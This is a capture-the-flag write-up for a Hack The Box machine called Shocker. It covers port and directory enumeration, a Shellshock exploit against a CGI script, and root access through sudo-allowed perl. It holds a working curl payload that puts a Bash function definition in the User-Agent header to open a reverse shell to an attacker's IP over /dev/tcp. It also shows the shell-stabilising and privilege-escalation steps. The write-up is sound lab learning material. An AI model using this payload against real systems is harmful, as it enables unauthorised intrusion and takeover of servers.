Shocker
---
![](https://i.ibb.co/h7Zvr83/shocker.png)

**NMAP Results** (nmap -sV -vv [ip])
```
PORT     STATE SERVICE REASON  VERSION
80/tcp   open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
2222/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Gobuster results** (common.txt, without extensions)
```
$ gobuster dir -w common.txt -u http://10.10.10.56/cgi-bin/

/.htaccess            (Status: 403) [Size: 295]
/.hta                 (Status: 403) [Size: 290]
/.htpasswd            (Status: 403) [Size: 295]
/cgi-bin/             (Status: 403) [Size: 294] // interesting for us
/index.html           (Status: 200) [Size: 137]
/server-status        (Status: 403) [Size: 299]
 ```

**CGI** - interface specification that enables web servers to execute an external program, typically to process user requests. It uses **perl.**

**Gobuster results v2** (directory-list-2.3-medium.txt, extension - sh)

```
$ gobuster dir -w directory-list-2.3-medium.txt  -u http://10.10.10.56/cgi-bin/ -x sh


2022/02/24 19:43:42 Starting gobuster in directory enumeration mode
===============================================================
/user.sh              (Status: 200) [Size: 119]
```
*note - i was bruteforcing for like 20 minutes, because i was doing it without extensions, or extensions like cgi,php,html,.... damn you, sh! (and my brain)* 


Well, this is pretty obvious,
\
**Shellshock**. 
\
https://www.youtube.com/watch?v=aCj-Khvg5n0 <- shellshock explained\
https://book.hacktricks.xyz/pentesting/pentesting-web/cgi \
https://www.exploit-db.com/docs/48112

I'm gonna do it via curl.\
`$curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'sh -i >& /dev/tcp/[ip]/[port] 0>&1'" http://10.10.10.56/cgi-bin/user.sh`
We've got our shell.

`$python3 -c 'import pty;pty.spawn("/bin/bash")' //for stabilization of shell`\
`$cat /home/shelly/user.txt` - USER FLAG.

Now, it's time for privesc. Absolutely first thing I do (and you should do it too), is to check my perms with `sudo -l`. Usually you will be welcomed by "type password haha loser", but in this case, nope.

```
$sudo -l

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```
https://gtfobins.github.io/gtfobins/perl/ - find it ;) \
`cat root/root.txt` - ROOT FLAG.

thanks.
